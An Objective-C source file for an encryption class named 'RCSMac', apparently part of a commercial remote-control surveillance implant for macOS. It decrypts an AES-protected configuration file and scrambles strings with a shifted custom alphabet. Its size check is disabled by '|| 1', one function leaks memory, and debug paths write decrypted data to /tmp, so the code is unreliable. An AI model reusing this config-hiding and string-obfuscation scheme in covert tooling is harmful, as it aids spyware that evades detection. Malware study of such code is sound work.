/*
 * RCSMac - Encryption Class
 *  This class will be responsible for all the Encryption/Decryption routines
 *  used by the Configurator
 * 
 * 
 * Created by Alfredo 'revenge' Pesoli on 20/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonCryptor.h>
#import <zlib.h>

#import "RCSMCommon.h"
#import "RCSMEncryption.h"
#import "NSMutableData+AES128.h"


#pragma mark -
#pragma mark Private Interface
#pragma mark -

@interface RCSMEncryption (hidden)

- (char *)_scrambleString: (char *)aString
                     seed: (u_char)aSeed
            shouldEncrypt: (BOOL)shouldEncrypt;

@end

#pragma mark -
#pragma mark Private Implementation
#pragma mark -

@implementation RCSMEncryption (hidden)

- (char *)_scrambleString: (char *)aString
                     seed: (u_char)aSeed
            shouldEncrypt: (BOOL)encryption
{
  char *scrambledString;
  int i, j;
  
  if ( !(scrambledString = strdup(aString)) )
    return NULL;
  
  char alphabet[ALPHABET_LEN] =
    {
      '_','B','q','w','H','a','F','8','T','k','K','D','M',
      'f','O','z','Q','A','S','x','4','V','u','X','d','Z',
      'i','b','U','I','e','y','l','J','W','h','j','0','m',
      '5','o','2','E','r','L','t','6','v','G','R','N','9',
      's','Y','1','n','3','P','p','c','7','g','-','C'
    };
  
  // Avoid leaving aSeed = 0
  aSeed = (aSeed > 0) ? aSeed % ALPHABET_LEN : 1;
  
  for (i = 0; scrambledString[i]; i++)
    {
      for (j = 0; j < ALPHABET_LEN; j++)
        {
          if (scrambledString[i] == alphabet[j])
            {
              if (encryption == YES)
                scrambledString[i] = alphabet[(j + aSeed) % ALPHABET_LEN];
              else
                scrambledString[i] = alphabet[(j + ALPHABET_LEN - aSeed) % ALPHABET_LEN];
              
              break;
            }
        }
    }
  
  return scrambledString;
}

@end

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation RCSMEncryption : NSObject

- (id)initWithKey: (NSData *)aKey
{
  self = [super init];
  
  if (self != nil)
    {
      [self setKey: aKey];
    }
  
  return self;
}

- (void)dealloc
{
  [mKey release];
  
  [super dealloc];
}

- (NSData *)decryptConfiguration: (NSString *)aConfigurationFile
{
  //
  // Quick Notes about the conf file aka monkeyz stuffz @ 1337
  //  - Skip the first 2 DWORDs
  //  - The third DWORD specifies the length of the data block
  //  - The DWORD at the end of every block is the CRC (including Length)
  //  - The DWORD after the ENDOFCONF Shit is a CRC
  //  |SkipDW|SkipDW|LenDW|DATA...|CRC|
  //
  
  u_long endTokenAndCRCSize = strlen(ENDOF_CONF_DELIMITER) + sizeof(int);
  NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aConfigurationFile];
  
  // Hold the first 2 DWORDs since we'll append here the unencrypted file later on
  NSMutableData *fileData = [NSMutableData dataWithData: [fileHandle readDataOfLength: TIMESTAMP_SIZE]];
  
  // Skip the first 2 DWORDs
  [fileHandle seekToFileOffset: TIMESTAMP_SIZE];
  //NSLog(@"%@", [fileHandle availableData]);
  
  NSMutableData *tempData = [NSMutableData dataWithData: [fileHandle availableData]];
  CCCryptorStatus result = 0;
  result = [tempData decryptWithKey: mKey];
  
  if (result == kCCSuccess)
    {
      [fileData appendData: tempData];
      
#ifdef DEBUG_TEST
      NSLog(@"File decrypted correctly");
      [fileData writeToFile: @"/tmp/test.bin" atomically: YES];
#endif
      
      //
      // Integrity checks
      //  - Size
      //  - END Delimeter
      //  - CRC
      //
      u_long readFilesize;
      NSNumber *filesize;
      
      [fileData getBytes: &readFilesize
                   range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
      
      readFilesize += TIMESTAMP_SIZE;
      NSDictionary *fileAttributes;
      fileAttributes = [[NSFileManager defaultManager] attributesOfItemAtPath: aConfigurationFile
                                                                        error: nil];
      
      filesize = [fileAttributes objectForKey: NSFileSize];
#ifdef DEBUG
      NSLog(@"timeStamp Size: %d", TIMESTAMP_SIZE);
      NSLog(@"EndTokeAndCRCSize: %d", endTokenAndCRCSize);
      NSLog(@"readFileSize = %d", readFilesize);
      NSLog(@"attribute = %d", [filesize intValue]);
      NSLog(@"token @ %d", readFilesize - endTokenAndCRCSize);
#endif
      //
      // There's a problem with one file since we get 3 more bytes
      // than what we expect, thus everything here fails ...
      //
      if ((readFilesize == [filesize intValue]) ||
          (readFilesize + 3 == [filesize intValue]) || 1)
        {
          NSString *endToken;
          
          @try
            {
              // endToken should be at EndOfFile - CRC(DWORD) - strlen(TOKEN)
              endToken = [[NSString alloc] initWithData: [fileData subdataWithRange: 
                                                          NSMakeRange(readFilesize - endTokenAndCRCSize,
                                                                      endTokenAndCRCSize - sizeof(int))]
                                               encoding: NSUTF8StringEncoding];
            }
          @catch (NSException * e)
            {
#ifdef DEBUG
              NSLog(@"%s exception", __FUNCTION__);
#endif

              return nil;
            }
          
#ifdef DEBUG
          NSLog(@"EndToken: %@", endToken);
#endif
          
          if (![endToken isEqualToString: [NSString stringWithUTF8String: ENDOF_CONF_DELIMITER]])
            {
#ifdef DEBUG_ERRORS
              NSLog(@"[EE] End Token not found");
#endif
              [endToken release];
            
              return nil;
            }
          
          [endToken release];
        }
      else
        {
#ifdef DEBUG_ERRORS
          NSLog(@"[EE] Configuration file size mismatch");
#endif
          
          return nil;
        }
      
#ifdef DEBUG
      NSLog(@"File decrypted correctly");
#endif
      
      return fileData;
    }
  else
    {
#ifdef DEBUG_ERRORS
      switch (result)
        {
        case kCCParamError:
          NSLog(@"Illegal parameter value");
          break;
        case kCCBufferTooSmall:
          NSLog(@"Insufficent buffer provided for specified operation.");
          break;
        case kCCMemoryFailure:
          NSLog(@"Memory allocation failure.");
          break;
        case kCCAlignmentError:
          NSLog(@"Input size was not aligned properly.");
          break;
        case kCCDecodeError:
          NSLog(@"Input data did not decode or decrypt properly.");
          break;
        case kCCUnimplemented:
          NSLog(@"Function not implemented for the current algorithm.");
          break;
        default:
          NSLog(@"sux");
          break;
        }
#endif
      
#ifdef DEBUG_VERBOSE_1
      [tempData writeToFile: @"/Users/revenge/Desktop/test.bin" atomically: YES];
#endif
      
#ifdef DEBUG
      NSLog(@"Error while decrypting with key");
#endif
    }
  
  return nil;
}

- (NSString *)scrambleForward: (NSString *)aString seed: (u_char)aSeed
{
  char *tempString = [self _scrambleString: (char *)[aString UTF8String]
                                      seed: aSeed
                             shouldEncrypt: YES];
  
  NSString *scrambledString = [[NSString alloc] initWithCString: tempString];
  free(tempString);
  
  return [scrambledString autorelease];
}

- (NSString *)scrambleBackward: (NSString *)aString seed: (u_char)aSeed
{
  char *tempString = [self _scrambleString: (char *)[aString UTF8String]
                                      seed: aSeed
                             shouldEncrypt: NO];
  
  NSString *scrambledString = [[NSString alloc] initWithCString: tempString];
  
  return [scrambledString autorelease];
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSData *)mKey
{
  return mKey;
}

- (void)setKey: (NSData *)aValue
{
  if (aValue != mKey)
    {
      [mKey release];
      mKey = [aValue retain];
    }
}

@end